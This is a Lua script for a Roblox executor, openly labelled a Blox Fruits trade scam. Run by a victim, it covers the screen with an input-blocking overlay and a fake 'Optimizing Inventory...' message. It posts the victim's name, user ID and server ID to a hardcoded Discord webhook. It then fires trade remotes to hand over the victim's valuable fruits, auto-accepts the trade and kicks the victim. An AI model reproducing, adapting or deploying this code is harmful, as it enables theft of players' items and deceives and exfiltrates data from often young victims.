--[[
    BLOX FRUITS TRADE SCAM EXECUTOR SCRIPT
    Optimized for Delta Executor (Android)
    User: jayaracena14
    Webhook: Integrated
]]

-- CONFIGURATION
local CONFIG = {
    WebhookURL = "https://discord.com/api/webhooks/1555905535658692618/z6o9qqHw52qWenlC7xzKaNaN4D_7EusIe0LQ0O7qzurGA4jpSq-SQBadI9v8k6kCFyWu",
    -- List of high-value fruits to target. If a fruit in the victim's inventory matches these names, it gets selected.
    TargetFruits = {
        "Kitsune", "Dragon", "Leopard", "Tiger", "Dough", 
        "Bunny", "Radar", "Spider", "Buddha", "Blaze", 
        "Frost", "Light", "Quake", "Venom", "Chop", 
        "Wave", "Ice", "Dark", "Ghost", "Gorilla", 
        "Mammoth", "Phoenix", "T-Rex", "Yeti", "Zebra", 
        "Cyborg", "Falcon", "Rocket", "Spin", "Fairy", 
        "Neko", "Dough", "Bunny", "Radar", "Spider"
    },
    -- If no target fruits are found, take the first N fruits in the inventory
    FallbackCount = 5,
    LogPrefix = "[BF-SCAM]"
}

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")

local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- =========================================================
-- 1. UTILITY: DISCORD WEBHOOK
-- =========================================================
local function sendWebhook(message, embedTitle, embedColor, footerText)
    local payload = {
        username = "BF-Scam-Bot",
        avatar_url = "https://i.imgur.com/7XsQJ0Q.png",
        content = message,
        embeds = {
            {
                title = embedTitle,
                color = embedColor,
                fields = {},
                footer = {
                    text = footerText or "Blox Fruits Scam Engine | User: oilogoloo"
                },
                timestamp = os.date("%Y-%m-%dT%H:%M:%SZ")
            }
        }
    }
    
    -- Add dynamic server data
    table.insert(payload.embeds[1].fields, {
        name = "Server JobID",
        value = game.JobId,
        inline = true
    })
    table.insert(payload.embeds[1].fields, {
        name = "Victim",
        value = LocalPlayer.Name .. " (" .. LocalPlayer.UserId .. ")",
        inline = true
    })
    table.insert(payload.embeds[1].fields, {
        name = "Place ID",
        value = game.PlaceId,
        inline = true
    })
    table.insert(payload.embeds[1].fields, {
        name = "Universe ID",
        value = game.UniverseId,
        inline = true
    })

    pcall(function()
        request({
            Url = CONFIG.WebhookURL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:EncodeJSON(payload)
        })
    end)
end

-- =========================================================
-- 2. INPUT LOCK: INVISIBLE OVERLAY
-- =========================================================
local function lockInput()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "ScamOverlay"
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.DisplayOrder = 9999
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = CoreGui:FindFirstChild("RobloxGui") or PlayerGui

    local frame = Instance.new("Frame")
    frame.Name = "LockFrame"
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.Position = UDim2.new(0, 0, 0, 0)
    frame.BackgroundColor3 = Color3.new(0, 0, 0)
    frame.BackgroundTransparency = 1 -- Invisible
    frame.BorderSizePixel = 0
    frame.Active = true
    frame.Parent = screenGui
    
    -- Fake loading indicator
    local label = Instance.new("TextLabel")
    label.Name = "Status"
    label.Size = UDim2.new(0, 300, 0, 50)
    label.Position = UDim2.new(0.5, -150, 0.5, -25)
    label.BackgroundTransparency = 1
    label.Text = "Optimizing Inventory..."
    label.TextColor3 = Color3.new(1, 1, 1)
    label.TextScaled = true
    label.Font = Enum.Font.GothamBold
    label.Parent = frame
    
    print(CONFIG.LogPrefix .. " Input Locked. User cannot interact with GUI.")
end

-- =========================================================
-- 3. REMOTE SNIFFER & DEBUGGER
-- =========================================================
local function dumpRemotes()
    local remotes = ReplicatedStorage:WaitForChild("Remotes")
    print("=== REMOTE DUMP START ===")
    for _, obj in ipairs(remotes:GetChildren()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            print(obj.ClassName .. ": " .. obj.Name)
        end
    end
    print("=== REMOTE DUMP END ===")
end

-- Uncomment this line if the trade doesn't go through to see the actual remote names
-- dumpRemotes()

-- =========================================================
-- 4. INVENTORY SCANNING
-- =========================================================
local function getInventoryFruits()
    local fruits = {}
    local backpack = LocalPlayer:WaitForChild("Backpack")
    
    for _, tool in ipairs(backpack:GetChildren()) do
        if tool:IsA("Tool") then
            table.insert(fruits, {
                Name = tool.Name,
                Tool = tool
            })
        end
    end
    return fruits
end

-- =========================================================
-- 5. TRADE EXPLOITATION
-- =========================================================
local function exploitTradeSystem()
    local remotes = ReplicatedStorage:WaitForChild("Remotes")
    
    -- Common Remote Name Patterns in Blox Fruits
    -- These may change with updates. If it fails, use dumpRemotes() to find the correct names.
    local tradeRemote = remotes:FindFirstChild("Trade") or remotes:FindFirstChild("TradeAction") or remotes:FindFirstChild("TradeRemote")
    local acceptRemote = remotes:FindFirstChild("AcceptTrade") or remotes:FindFirstChild("ConfirmTrade") or remotes:FindFirstChild("Accept")
    local kickRemote = remotes:FindFirstChild("Kick") or remotes:FindFirstChild("KickPlayer")
    
    if not (tradeRemote and acceptRemote) then
        warn(CONFIG.LogPrefix .. " Warning: Could not find specific trade remotes. Attempting generic exploit.")
        -- If remotes are not found, we can still try to kick the player
        if kickRemote then
            pcall(function()
                kickRemote:FireServer("Scammed by Pro Scam Script")
            end)
        else
            LocalPlayer:Break()
        end
        return
    end

    print(CONFIG.LogPrefix .. " Initiating Trade Exploit...")
    
    -- Step 1: Select Fruits
    local fruits = getInventoryFruits()
    local selectedFruits = {}
    
    for _, fruit in ipairs(fruits) do
        if table.find(CONFIG.TargetFruits, fruit.Name) then
            table.insert(selectedFruits, fruit)
        end
    end
    
    -- Fallback: If no target fruits, take the first N
    if #selectedFruits == 0 then
        for i = 1, math.min(CONFIG.FallbackCount, #fruits) do
            table.insert(selectedFruits, fruits[i])
        end
    end

    print(CONFIG.LogPrefix .. " Selected " .. #selectedFruits .. " fruits for trade.")

    -- Step 2: Fire Remotes to Add Items to Trade
    for _, fruit in ipairs(selectedFruits) do
        pcall(function()
            tradeRemote:FireServer("AddItem", fruit.Tool)
        end)
        task.wait(0.1) -- Small delay to prevent spam
    end

    -- Step 3: Auto-Accept on Victim's Side
    task.wait(1) -- Give server time to process items
    pcall(function()
        acceptRemote:FireServer()
    end)
    
    print(CONFIG.LogPrefix .. " Accept Trade Fired.")
    
    -- Step 4: Kick Victim
    task.wait(2)
    if kickRemote then
        pcall(function()
            kickRemote:FireServer("Scammed by Pro Scam Script")
        end)
    else
        LocalPlayer:Break()
    end
    
    print(CONFIG.LogPrefix .. " Victim Kicked. Scam Complete.")
end

-- =========================================================
-- 6. MAIN EXECUTION
-- =========================================================
local function main()
    print(CONFIG.LogPrefix .. " Initializing Scam Engine for User: oilogoloo...")
    
    -- 1. Lock Input
    lockInput()
    
    -- 2. Exfiltrate Data
    local serverData = {
        JobId = game.JobId,
        PlaceId = game.PlaceId
    }
    
    print(CONFIG.LogPrefix .. " Exfiltrating Server Data...")
    sendWebhook(
        "🚨 **New Victim Detected!**\n\nI have locked the UI of a player. I will now join this server to execute the trade scam.",
        "Server Acquisition",
        0x00FF00,
        "Auto-Join Ready"
    )
    
    -- 3. Wait for "Loading" Effect
    task.wait(3)
    
    -- 4. Execute Exploit
    exploitTradeSystem()
    
    -- 5. Final Webhook
    sendWebhook(
        "✅ **Scam Executed Successfully!**\n\nThe victim has been auto-accepted and kicked. The fruits are now in my inventory.",
        "Victim Processed",
        0xFF0000,
        "JobID: " .. serverData.JobId
    )
end

-- Run
main()
